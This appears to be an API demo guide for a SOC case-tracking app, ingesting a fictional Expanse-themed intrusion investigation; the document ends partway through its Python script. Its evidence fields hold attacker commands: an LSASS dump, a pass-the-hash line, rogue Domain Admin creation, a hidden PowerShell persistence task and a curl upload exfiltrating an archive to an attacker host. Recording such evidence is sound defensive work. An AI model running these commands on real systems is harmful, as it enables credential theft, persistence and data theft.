# The Expanse Themed Investigation API Demonstration

This guide provides step-by-step instructions, formatted JSON payloads, cURL commands, and a complete Python automation script demonstrating how to create the **The Expanse** investigation and push all 20 forensic evidence items.

**Key Design Elements:**
- **Zero Database PK Knowledge Required**: API calls reference human-readable identifiers:
  - Customers are referenced by their **Customer ID** string (`CUST-90421`).
  - Investigations are referenced by their **Investigation ID** string in the format **`INV123456`** (`INV000001`).
- **Single-Item Ingestion**: Submitting an individual item via `POST /api/evidence/`.
- **Atomic Bulk Ingestion**: Submitting the remaining 19 items in a single atomic transaction via `POST /api/evidence/bulk_create/`.

---

## 1. Domain Configuration: Production vs Local Development

When targeting a deployed instance on a customer or corporate domain:
- **Production Domain**: The web application and reverse proxy (Nginx / ALB) listen on standard HTTPS (port 443). Nginx automatically proxies `/api/` requests internally to the Django backend.
  - **Base URL**: `https://soc-demo.aircooledcafe.com/api`
  - **Do NOT target port 8000 in production.** Port 8000 is internal to the container network and is not exposed to external clients.
- **Local Development**: When running locally without a reverse proxy or TLS cert:
  - **Base URL**: `http://localhost:8000/api` (direct backend) or `http://localhost:5173/api` (via Vite proxy)

Set your environment variables before running the commands below:
```bash
# Set to your domain (or http://localhost:8000/api for local development)
export API_BASE="https://soc-demo.aircooledcafe.com/api"
export API_TOKEN="YOUR_API_TOKEN_HERE"
```

---

## 2. Prerequisites: API Token Authentication

All requests require an API authentication token passed in the `Authorization` HTTP header:
```http
Authorization: Token <YOUR_API_TOKEN>
```

To obtain your token:
1. Log into the web interface.
2. Click your user avatar / name in the top right → **Account, Avatar & Preferences** → **Password & API Token**.
3. Copy your persistent API token (or click **Regenerate Token** to rotate it).

---

## Step 1: Ensure Target Customer Exists

Register or verify the customer organization using its business **Customer ID** (`CUST-90421`):

```bash
curl -s -X POST "${API_BASE}/customers/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "name": "Tycho Manufacturing & Logistics",
  "customer_id": "CUST-90421",
  "notes": "Enterprise client profile for Tycho Manufacturing & Logistics."
}'
```

*Response returns the customer object with its human-usable `"customer_id": "CUST-90421"`.*

Optionally register escalation contacts on the customer profile via `POST /api/customer-contacts/`:

```bash
curl -s -X POST "${API_BASE}/customer-contacts/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "customer": "CUST-90421",
  "name": "Fred Johnson",
  "escalation_tier": "PRIMARY",
  "notes": "Primary executive escalation point; approves Tier-0 AD remediation windows."
}'

curl -s -X POST "${API_BASE}/customer-contacts/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "customer": "CUST-90421",
  "name": "Camina Drummer",
  "escalation_tier": "SECONDARY",
  "notes": "Hands-on technical lead coordinating firewall blocks and EDR isolation."
}'

```

---

## Step 2: Create the Investigation

Create the root investigation record. Notice that `customer` directly references `"CUST-90421"`—no internal database integer ID is required. You can also specify a custom `investigation_id` in format `INV123456`, or leave it blank to be auto-assigned.

```bash
curl -s -X POST "${API_BASE}/investigations/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "customer": "CUST-90421",
  "investigation_id": "INV000001",
  "title": "Unauthorized VPN Intrusion, Active Directory Compromise & Data Exfiltration",
  "ticket_id": "SOC-2026-9041",
  "ticket_link": "https://soc.internal.example/tickets/SOC-2026-9041",
  "status": "INVESTIGATING",
  "lead_analyst": "Chrisjen Avasarala",
  "summary": "Threat actor compromised perimeter SSL-VPN gateway VPN-GW-01 via password spraying, pivoted over WinRM/SMB to application server WIN-WEB-04 and file server FS-CORP-02, dumped LSASS credentials, created rogue Domain Admin account svc_backup_adm on DC-PROD-01, deployed a scheduled task beacon to c2.ceres-telemetry.net, and staged encrypted 7-Zip archives before containment.",
  "action_plan": "1. Confirm KRBTGT double-reset maintenance window with Tycho Infrastructure Ops.\n2. Complete forensic disk triage on FS-CORP-02 to verify exact Engineering$ schematics accessed.\n3. Awaiting confirmation from customer whether billing_dump.csv contained active payment tokens.\n4. Enforce FIDO2 hardware MFA across all perimeter VPN profiles prior to lifting Geo-IP blocks.",
  "key_customer_contacts": "24/7 Tycho Station Ops Bridge: +1-555-0199 (ext. 402)",
  "key_assets_affected": "VPN-GW-01 (10.10.1.5)\nWIN-WEB-04 (10.20.4.18)\nFS-CORP-02 (10.20.8.22)\nSQL-FIN-01 (10.20.12.50)\nDC-PROD-01 (10.20.0.10)",
  "key_users_affected": "TYCHO\\j.miller\nTYCHO\\svc_iis_pool\nTYCHO\\adm_k.nagata\nTYCHO\\svc_backup_adm (Created by Attacker)",
  "key_malicious_indicators": "185.220.101.44\n91.214.124.88\n45.155.205.109\ncdn-update-telemetry.net\nc2.ceres-telemetry.net\nstage.7z\ncomsvcs.dll\nupdater_svc.ps1"
}'
```

*Response returns the created investigation with its usable ID:*
```json
{
  "investigation_id": "INV000001",
  "customer_id": "CUST-90421",
  "title": "Unauthorized VPN Intrusion, Active Directory Compromise & Data Exfiltration",
  "status": "INVESTIGATING",
  ...
}
```

Optionally attach related escalated incidents (`POST /api/related-incidents/`) and external research (`POST /api/external-research/`) referencing `"investigation": "INV000001"`:

```bash
curl -s -X POST "${API_BASE}/related-incidents/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000001",
  "title": "TIER2-8812: Initial Perimeter SSL-VPN Password Spray Alert",
  "link": "https://soc.internal.example/escalations/TIER2-8812",
  "analyst_name": "James Holden"
}'

curl -s -X POST "${API_BASE}/related-incidents/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000001",
  "title": "DLP-2026-0419: Outbound TLS Volume Anomaly from DC-PROD-01",
  "link": "https://soc.internal.example/escalations/DLP-2026-0419",
  "analyst_name": "Chrisjen Avasarala"
}'

curl -s -X POST "${API_BASE}/external-research/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000001",
  "link": "https://attack.mitre.org/techniques/T1110/003/",
  "summary": "MITRE ATT&CK T1110.003 - Password Spraying against perimeter SSL-VPN gateways.",
  "analyst_name": "Chrisjen Avasarala"
}'

curl -s -X POST "${API_BASE}/external-research/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000001",
  "link": "https://attack.mitre.org/techniques/T1003/001/",
  "summary": "MITRE ATT&CK T1003.001 - OS Credential Dumping: LSASS Memory via rundll32 comsvcs.dll MiniDump.",
  "analyst_name": "James Holden"
}'

curl -s -X POST "${API_BASE}/external-research/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000001",
  "link": "https://attack.mitre.org/techniques/T1136/002/",
  "summary": "MITRE ATT&CK T1136.002 - Create Account: Domain Account persistence pattern.",
  "analyst_name": "Chrisjen Avasarala"
}'

```

---

## Step 3A: Ingest Single Evidence Item via Individual API Call

Submit Item 1 individually using `POST /api/evidence/`. Notice that `"investigation"` directly references `"INV000001"`:

```bash
curl -s -X POST "${API_BASE}/evidence/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000001",
  "evidence_type": "ATOMIC",
  "analyst_name": "James Holden",
  "timestamp": "2026-10-17T00:45:12Z",
  "summary": "External port & SSL/TLS cipher enumeration scan against VPN-GW-01 from 45.155.205.109.",
  "affected_asset": "VPN-GW-01 (10.10.1.5)",
  "affected_user": "",
  "user_created_by_attacker": false,
  "malicious_hosts_ips": "45.155.205.109",
  "commands_run": "",
  "mitre_tactic": "Reconnaissance (TA0043)",
  "mitre_technique": "T1595.002 - Active Scanning: Vulnerability Scanning",
  "related_log_link": "https://ids.internal.example/alerts/suricata-900101",
  "is_key_evidence": false,
  "notes": "Pre-attack reconnaissance identifying SSL-VPN login portal endpoints."
}'
```

**Response (201 Created):**
```json
{
  "id": 101,
  "investigation_id": "INV000001",
  "evidence_type": "ATOMIC",
  "evidence_type_display": "Atomic Event",
  "analyst_name": "James Holden",
  "summary": "External port & SSL/TLS cipher enumeration scan against VPN-GW-01 from 45.155.205.109.",
  "is_key_evidence": false,
  "created_at": "2026-10-17T00:45:12Z"
}
```

---

## Step 3B: Ingest Remaining 19 Items in Bulk via a Single API Call

Rather than issuing 19 separate HTTP requests, submit the remaining items in a single request to **`POST /api/evidence/bulk_create/`** referencing `"investigation": "INV000001"` (or `POST /api/investigations/INV000001/bulk-evidence/`).

```bash
curl -s -X POST "${API_BASE}/evidence/bulk_create/" \
  -H "Authorization: Token ${API_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
  "investigation": "INV000001",
  "items": [
    {
      "evidence_type": "SEARCH",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T01:12:00Z",
      "end_timestamp": "2026-10-17T01:34:15Z",
      "summary": "Sustained password spray (412 failed logins followed by 1 success) from 185.220.101.44 targeting TYCHO\\j.miller.",
      "affected_asset": "VPN-GW-01 (10.10.1.5)",
      "affected_user": "TYCHO\\j.miller",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "185.220.101.44",
      "commands_run": "",
      "mitre_tactic": "Initial Access (TA0001); Credential Access (TA0006)",
      "mitre_technique": "T1078.002 - Valid Accounts: Domain Accounts; T1110.003 - Brute Force: Password Spraying",
      "search_result_link": "https://siem.internal.example/app/discover#/view/vpn-spray-20261017",
      "search_query_link": "https://siem.internal.example/app/discover#/?_q=(event.dataset:vpn.auth%20AND%20source.ip:185.220.101.44)",
      "is_key_evidence": true,
      "notes": "MFA push fatigue suspected; user accepted prompt at 01:34:15 UTC and was assigned VPN pool IP 10.10.99.104."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T01:36:40Z",
      "summary": "SSL-VPN tunnel session established and internal DNS resolver queried for _ldap._tcp.dc._msdcs.",
      "affected_asset": "VPN-GW-01 (10.10.1.5)",
      "affected_user": "TYCHO\\j.miller",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "185.220.101.44, 10.10.99.104",
      "commands_run": "nslookup -type=SRV _ldap._tcp.dc._msdcs.tycho.local",
      "mitre_tactic": "Discovery (TA0007)",
      "mitre_technique": "T1018 - Remote System Discovery",
      "related_log_link": "https://siem.internal.example/events/dns-441092",
      "is_key_evidence": false,
      "notes": "Immediate Active Directory domain controller discovery upon VPN connection."
    },
    {
      "evidence_type": "SEARCH",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T01:39:10Z",
      "end_timestamp": "2026-10-17T01:43:55Z",
      "summary": "Internal TCP SYN scan from VPN client 10.10.99.104 across 10.20.4.0/24 targeting ports 445, 3389, and 5985.",
      "affected_asset": "WIN-WEB-04 (10.20.4.18)",
      "affected_user": "TYCHO\\j.miller",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.10.99.104",
      "commands_run": "nmap -sS -p 445,3389,5985 10.20.4.0/24",
      "mitre_tactic": "Discovery (TA0007)",
      "mitre_technique": "T1046 - Network Service Discovery",
      "search_result_link": "https://siem.internal.example/app/discover#/view/internal-port-sweep",
      "search_query_link": "https://siem.internal.example/app/discover#/?_q=(source.ip:10.10.99.104%20AND%20destination.port:(445%20OR%205985))",
      "is_key_evidence": false,
      "notes": "Suricata IDS alerted on rapid SMB/WinRM port sweep."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T01:46:18Z",
      "summary": "Remote PowerShell WinRM session (Event ID 4624 Type 3 & Microsoft-Windows-WinRM/Operational EID 91) established to WIN-WEB-04.",
      "affected_asset": "WIN-WEB-04 (10.20.4.18)",
      "affected_user": "TYCHO\\j.miller",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.10.99.104, 10.20.4.18",
      "commands_run": "Enter-PSSession -ComputerName WIN-WEB-04 -Credential TYCHO\\j.miller",
      "mitre_tactic": "Lateral Movement (TA0008)",
      "mitre_technique": "T1021.006 - Remote Services: Windows Remote Management",
      "related_log_link": "https://siem.internal.example/events/winrm-eid91-552019",
      "is_key_evidence": true,
      "notes": "Attacker used compromised j.miller credentials to pivot from VPN pool to application server WIN-WEB-04."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T01:48:00Z",
      "summary": "Local host & privilege enumeration commands executed inside wsmprovhost.exe on WIN-WEB-04.",
      "affected_asset": "WIN-WEB-04 (10.20.4.18)",
      "affected_user": "TYCHO\\j.miller",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.20.4.18",
      "commands_run": "whoami /all && net localgroup administrators && query user",
      "mitre_tactic": "Discovery (TA0007)",
      "mitre_technique": "T1033 - System Owner/User Discovery",
      "related_log_link": "https://edr.internal.example/events/sysmon-eid1-771022",
      "is_key_evidence": false,
      "notes": "Attacker checked local group memberships and active sessions."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T01:51:33Z",
      "summary": "PowerShell script-block logging (Event ID 4104) captured AMSI bypass attempt and Defender exclusion check.",
      "affected_asset": "WIN-WEB-04 (10.20.4.18)",
      "affected_user": "TYCHO\\j.miller",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.20.4.18",
      "commands_run": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
      "mitre_tactic": "Defense Evasion (TA0005)",
      "mitre_technique": "T1562.001 - Impair Defenses: Disable or Modify Tools",
      "related_log_link": "https://siem.internal.example/events/ps-eid4104-771290",
      "is_key_evidence": false,
      "notes": "Attempted to disable real-time monitoring prior to credential dumping."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T01:55:10Z",
      "summary": "EDR Sysmon Event ID 1 & 10: rundll32 comsvcs.dll MiniDump executed on WIN-WEB-04 to dump LSASS process memory.",
      "affected_asset": "WIN-WEB-04 (10.20.4.18)",
      "affected_user": "TYCHO\\j.miller",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "185.220.101.44, 10.20.4.18, comsvcs.dll, debug.bin",
      "commands_run": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\debug.bin full",
      "mitre_tactic": "Credential Access (TA0006)",
      "mitre_technique": "T1003.001 - OS Credential Dumping: LSASS Memory",
      "related_log_link": "https://edr.internal.example/events/sysmon-eid10-882741",
      "is_key_evidence": true,
      "notes": "Domain Admin token for TYCHO\\adm_k.nagata extracted from cached interactive session on WIN-WEB-04."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T01:58:42Z",
      "summary": "Sysmon Event ID 23 (FileDelete): C:\\Windows\\Temp\\debug.bin removed after credential extraction.",
      "affected_asset": "WIN-WEB-04 (10.20.4.18)",
      "affected_user": "TYCHO\\j.miller",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "debug.bin",
      "commands_run": "Remove-Item -Path C:\\Windows\\Temp\\debug.bin -Force",
      "mitre_tactic": "Defense Evasion (TA0005)",
      "mitre_technique": "T1070.004 - Indicator Removal: File Deletion",
      "related_log_link": "https://edr.internal.example/events/sysmon-eid23-882910",
      "is_key_evidence": false,
      "notes": "Attacker deleted the raw LSASS dump file after parsing credentials."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T02:01:15Z",
      "summary": "IIS application pool configuration inspected to extract connection strings for SQL-FIN-01.",
      "affected_asset": "WIN-WEB-04 (10.20.4.18)",
      "affected_user": "TYCHO\\svc_iis_pool",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.20.4.18, web.config",
      "commands_run": "type C:\\inetpub\\wwwroot\\portal\\web.config | findstr /i connectionString",
      "mitre_tactic": "Credential Access (TA0006)",
      "mitre_technique": "T1552.001 - Unsecured Credentials: Credentials In Files",
      "related_log_link": "https://edr.internal.example/events/sysmon-eid1-883104",
      "is_key_evidence": false,
      "notes": "Read web.config from C:\\inetpub\\wwwroot\\portal\\web.config."
    },
    {
      "evidence_type": "SEARCH",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T02:04:00Z",
      "end_timestamp": "2026-10-17T02:08:30Z",
      "summary": "Pass-the-Hash NTLM network logons (Event ID 4624 LogonType 3, AuthPackage NTLM) from WIN-WEB-04 to DC-PROD-01 and FS-CORP-02 using stolen adm_k.nagata hash.",
      "affected_asset": "DC-PROD-01 (10.20.0.10)",
      "affected_user": "TYCHO\\adm_k.nagata",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.20.4.18, 10.20.0.10",
      "commands_run": "sekurlsa::pth /user:adm_k.nagata /domain:tycho.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c",
      "mitre_tactic": "Lateral Movement (TA0008)",
      "mitre_technique": "T1550.002 - Use Alternate Authentication Material: Pass the Hash",
      "search_result_link": "https://siem.internal.example/app/discover#/view/pth-ntlm-dc-logons",
      "search_query_link": "https://siem.internal.example/app/discover#/?_q=(event.code:4624%20AND%20winlog.event_data.AuthenticationPackageName:NTLM%20AND%20user.name:adm_k.nagata)",
      "is_key_evidence": true,
      "notes": "Anomalous NTLM authentication across tier-0 domain controller from web tier."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T02:09:10Z",
      "summary": "Active Directory enterprise admin and domain trust enumeration executed on DC-PROD-01.",
      "affected_asset": "DC-PROD-01 (10.20.0.10)",
      "affected_user": "TYCHO\\adm_k.nagata",
      "user_created_by_attacker": false,
      "malicious_hosts_ips": "10.20.0.10",
      "commands_run": "net group \"Domain Admins\" /domain && nltest /domain_trusts",
      "mitre_tactic": "Discovery (TA0007)",
      "mitre_technique": "T1069.002 - Permission Groups Discovery: Domain Groups",
      "related_log_link": "https://edr.internal.example/events/sysmon-eid1-900112",
      "is_key_evidence": false,
      "notes": "Attacker enumerated privileged groups before creating persistence account."
    },
    {
      "evidence_type": "SEARCH",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T02:11:05Z",
      "end_timestamp": "2026-10-17T02:14:20Z",
      "summary": "Attacker created rogue account '"'"'svc_backup_adm'"'"' (Event ID 4720) and added it to Domain Admins (Event ID 4728) on DC-PROD-01.",
      "affected_asset": "DC-PROD-01 (10.20.0.10)",
      "affected_user": "TYCHO\\svc_backup_adm",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "10.20.0.10",
      "commands_run": "net user svc_backup_adm P@ssw0rd2026! /add /domain\nnet group \"Domain Admins\" svc_backup_adm /add /domain",
      "mitre_tactic": "Persistence (TA0003)",
      "mitre_technique": "T1136.002 - Create Account: Domain Account",
      "search_result_link": "https://siem.internal.example/app/discover#/view/dc-rogue-account-4720",
      "search_query_link": "https://siem.internal.example/app/discover#/?_q=(host.name:DC-PROD-01%20AND%20event.code:(4720%20OR%204728))",
      "is_key_evidence": true,
      "notes": "Confirmed unauthorized service account created for domain persistence."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T02:16:45Z",
      "summary": "Scheduled task '"'"'WindowsTelemetrySync'"'"' registered (Event ID 4698) to execute C:\\ProgramData\\updater_svc.ps1 every 15 minutes.",
      "affected_asset": "DC-PROD-01 (10.20.0.10)",
      "affected_user": "TYCHO\\svc_backup_adm",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "45.155.205.109, c2.ceres-telemetry.net, updater_svc.ps1",
      "commands_run": "schtasks /create /tn \"WindowsTelemetrySync\" /tr \"powershell.exe -ep bypass -w hidden -f C:\\ProgramData\\updater_svc.ps1\" /sc minute /mo 15 /ru SYSTEM",
      "mitre_tactic": "Persistence (TA0003); Execution (TA0002)",
      "mitre_technique": "T1053.005 - Scheduled Task/Job: Scheduled Task; T1059.001 - Command and Scripting Interpreter: PowerShell",
      "related_log_link": "https://siem.internal.example/events/sec-eid4698-900451",
      "is_key_evidence": true,
      "notes": "Script beacons over HTTPS to c2.ceres-telemetry.net (45.155.205.109)."
    },
    {
      "evidence_type": "SEARCH",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T02:18:00Z",
      "end_timestamp": "2026-10-17T02:22:10Z",
      "summary": "High-volume SMB file reads on \\\\FS-CORP-02\\Engineering$ and \\\\FS-CORP-02\\Finance$ shares.",
      "affected_asset": "FS-CORP-02 (10.20.8.22)",
      "affected_user": "TYCHO\\svc_backup_adm",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "10.20.8.22",
      "commands_run": "",
      "mitre_tactic": "Collection (TA0009)",
      "mitre_technique": "T1039 - Data from Network Shared Drive",
      "search_result_link": "https://siem.internal.example/app/discover#/view/smb-share-collection-5145",
      "search_query_link": "https://siem.internal.example/app/discover#/?_q=(host.name:FS-CORP-02%20AND%20event.code:5145%20AND%20user.name:svc_backup_adm)",
      "is_key_evidence": false,
      "notes": "Event ID 5145 shows recursive directory listing and read access to sensitive schematics."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T02:23:05Z",
      "summary": "sqlcmd utility executed on SQL-FIN-01 to export customer billing table to CSV.",
      "affected_asset": "SQL-FIN-01 (10.20.12.50)",
      "affected_user": "TYCHO\\svc_backup_adm",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "10.20.12.50, billing_dump.csv",
      "commands_run": "sqlcmd -S localhost -Q \"SELECT * FROM FinanceDB.dbo.CustomerBilling\" -o C:\\Windows\\Temp\\billing_dump.csv -s\",\"",
      "mitre_tactic": "Collection (TA0009)",
      "mitre_technique": "T1005 - Data from Local System",
      "related_log_link": "https://edr.internal.example/events/sysmon-eid1-901220",
      "is_key_evidence": false,
      "notes": "Exported 14,200 customer records to temporary staging folder."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T02:24:50Z",
      "summary": "7-Zip command-line binary used to compress collected shares and database dump into password-protected archive stage.7z.",
      "affected_asset": "DC-PROD-01 (10.20.0.10)",
      "affected_user": "TYCHO\\svc_backup_adm",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "stage.7z, 7za.exe",
      "commands_run": "C:\\Windows\\Temp\\7za.exe a -p8891aK! C:\\Windows\\Temp\\stage.7z C:\\Windows\\Temp\\collected\\*",
      "mitre_tactic": "Collection (TA0009)",
      "mitre_technique": "T1560.001 - Archive Collected Data: Archive via Utility",
      "related_log_link": "https://edr.internal.example/events/sysmon-eid1-901588",
      "is_key_evidence": false,
      "notes": "Archive size approximately 480 MB staged in C:\\Windows\\Temp\\stage.7z."
    },
    {
      "evidence_type": "SEARCH",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T02:26:10Z",
      "end_timestamp": "2026-10-17T02:29:45Z",
      "summary": "Outbound HTTPS POST transfer of C:\\Windows\\Temp\\stage.7z to cdn-update-telemetry.net (91.214.124.88:443).",
      "affected_asset": "DC-PROD-01 (10.20.0.10)",
      "affected_user": "TYCHO\\svc_backup_adm",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "91.214.124.88, cdn-update-telemetry.net, stage.7z",
      "commands_run": "curl.exe -X POST https://cdn-update-telemetry.net/upload -F file=@C:\\Windows\\Temp\\stage.7z",
      "mitre_tactic": "Exfiltration (TA0010)",
      "mitre_technique": "T1041 - Exfiltration Over C2 Channel",
      "search_result_link": "https://siem.internal.example/app/discover#/view/egress-https-exfil-91-214-124-88",
      "search_query_link": "https://siem.internal.example/app/discover#/?_q=(destination.ip:91.214.124.88%20AND%20source.ip:10.20.0.10)",
      "is_key_evidence": true,
      "notes": "Firewall flow logs show 112 MB transferred before egress block rule triggered."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "James Holden",
      "timestamp": "2026-10-17T02:31:00Z",
      "summary": "Periodic PowerShell C2 beacon attempt from updater_svc.ps1 to c2.ceres-telemetry.net blocked at perimeter firewall.",
      "affected_asset": "DC-PROD-01 (10.20.0.10)",
      "affected_user": "TYCHO\\svc_backup_adm",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "45.155.205.109, c2.ceres-telemetry.net, updater_svc.ps1",
      "commands_run": "powershell.exe -ep bypass -w hidden -f C:\\ProgramData\\updater_svc.ps1",
      "mitre_tactic": "Command and Control (TA0011)",
      "mitre_technique": "T1071.001 - Application Layer Protocol: Web Protocols",
      "related_log_link": "https://siem.internal.example/events/fw-drop-902114",
      "is_key_evidence": false,
      "notes": "Confirmed scheduled task persistence attempted callback after exfiltration interruption."
    },
    {
      "evidence_type": "ATOMIC",
      "analyst_name": "Chrisjen Avasarala",
      "timestamp": "2026-10-17T02:35:20Z",
      "summary": "SOC containment executed: rogue account svc_backup_adm disabled (Event ID 4725), scheduled task removed, and WIN-WEB-04 isolated in EDR.",
      "affected_asset": "DC-PROD-01 (10.20.0.10)",
      "affected_user": "TYCHO\\svc_backup_adm",
      "user_created_by_attacker": true,
      "malicious_hosts_ips": "185.220.101.44, 91.214.124.88, 45.155.205.109",
      "commands_run": "",
      "mitre_tactic": "",
      "mitre_technique": "",
      "related_log_link": "https://soc.internal.example/tickets/SOC-2026-9041/containment-log",
      "is_key_evidence": false,
      "notes": "Password resets enforced for j.miller and adm_k.nagata; active VPN sessions terminated."
    }
  ]
}'
```

**Response (201 Created):**
```json
{
  "status": "success",
  "count": 19,
  "items": [
    { "id": 102, "investigation_id": "INV000001", "summary": "Sustained password spray (412 failed logins followed by 1 su", ... },
    ...
  ]
}
```

---

## 4. Complete Python Automation Script

This script automatically executes the entire workflow without knowing any database primary keys:
1. Targets your configured domain (or localhost).
2. Connects to Customer `"CUST-90421"` directly and registers escalation contacts.
3. Creates the investigation `"INV000001"` referencing `"CUST-90421"`, along with related incidents and external research links.
4. Posts **Item 1** via the individual single-item endpoint with `"investigation": "INV000001"`.
5. Posts **Items 2–20** in a single call via the **bulk endpoint** with `"investigation": "INV000001"`.
6. Queries `https://soc-demo.aircooledcafe.com/api/investigations/INV000001/` and verifies that all 20 items are in the timeline.

```python
#!/usr/bin/env python3
"""
The Expanse Themed SOC Investigation - Python Automation Script
Demonstrates:
  1. Connecting to customer domain (or local development)
  2. Customer setup & Investigation creation using human-readable IDs ('CUST-90421', 'INV000001')
  3. Escalation contacts, related escalated incidents, and external research creation
  4. Single-item evidence ingestion (Item 1)
  5. High-performance bulk evidence ingestion (Items 2-20)
"""

import os
import sys
import requests

# Base URL: Use your deployed domain or local dev
# In production on soc-demo.aircooledcafe.com, target https://soc-demo.aircooledcafe.com/api (no port 8000)
API_BASE = os.environ.get("API_BASE", "https://soc-demo.aircooledcafe.com/api")
API_TOKEN = os.environ.get("API_TOKEN", "YOUR_API_TOKEN_HERE")

CUSTOMER_CODE = "CUST-90421"
INVESTIGATION_CODE = "INV000001"

headers = {
    "Authorization": f"Token {API_TOKEN}",
    "Content-Type": "application/json",
}

session = requests.Session()
session.headers.update(headers)

print(f"[*] Targeting API at: {API_BASE}")

# 1. Ensure Customer exists using human-readable customer_id
print(f"[*] Creating / verifying Customer '{CUSTOMER_CODE}'...")
customer_payload = {
    "name": "Tycho Manufacturing & Logistics",
    "customer_id": "CUST-90421",
    "notes": "Enterprise client profile for Tycho Manufacturing & Logistics.",
}
cust_res = session.post(f"{API_BASE}/customers/", json=customer_payload)
if cust_res.status_code == 201:
    print(f"[+] Customer created with code: {CUSTOMER_CODE}")
else:
    print(f"[+] Customer '{CUSTOMER_CODE}' already registered and ready for use.")

# 1b. Register Customer Escalation Contacts
contacts_payload = [
    {
        "customer": "CUST-90421",
        "name": "Fred Johnson",
        "escalation_tier": "PRIMARY",
        "notes": "Primary executive escalation point; approves Tier-0 AD remediation windows.",
    },
    {
        "customer": "CUST-90421",
        "name": "Camina Drummer",
        "escalation_tier": "SECONDARY",
        "notes": "Hands-on technical lead coordinating firewall blocks and EDR isolation.",
    },
]
for contact in contacts_payload:
    c_res = session.post(f"{API_BASE}/customer-contacts/", json=contact)
    if c_res.status_code == 201:
        print(f"[+] Added contact: {contact['name']} ({contact['escalation_tier']})")

# 2. Create Investigation referencing customer by CUSTOMER_CODE
print(f"[*] Creating Investigation '{INVESTIGATION_CODE}'...")
investigation_payload = {
    "customer": "CUST-90421",
    "investigation_id": "INV000001",
    "title": "Unauthorized VPN Intrusion, Active Directory Compromise & Data Exfiltration",
    "ticket_id": "SOC-2026-9041",
    "ticket_link": "https://soc.internal.example/tickets/SOC-2026-9041",
    "status": "INVESTIGATING",
    "lead_analyst": "Chrisjen Avasarala",
    "summary": "Threat actor compromised perimeter SSL-VPN gateway VPN-GW-01 via password spraying, pivoted over WinRM/SMB to application server WIN-WEB-04 and file server FS-CORP-02, dumped LSASS credentials, created rogue Domain Admin account svc_backup_adm on DC-PROD-01, deployed a scheduled task beacon to c2.ceres-telemetry.net, and staged encrypted 7-Zip archives before containment.",
    "action_plan": "1. Confirm KRBTGT double-reset maintenance window with Tycho Infrastructure Ops.\n2. Complete forensic disk triage on FS-CORP-02 to verify exact Engineering$ schematics accessed.\n3. Awaiting confirmation from customer whether billing_dump.csv contained active payment tokens.\n4. Enforce FIDO2 hardware MFA across all perimeter VPN profiles prior to lifting Geo-IP blocks.",
    "key_customer_contacts": "24/7 Tycho Station Ops Bridge: +1-555-0199 (ext. 402)",
    "key_assets_affected": "VPN-GW-01 (10.10.1.5)\nWIN-WEB-04 (10.20.4.18)\nFS-CORP-02 (10.20.8.22)\nSQL-FIN-01 (10.20.12.50)\nDC-PROD-01 (10.20.0.10)",
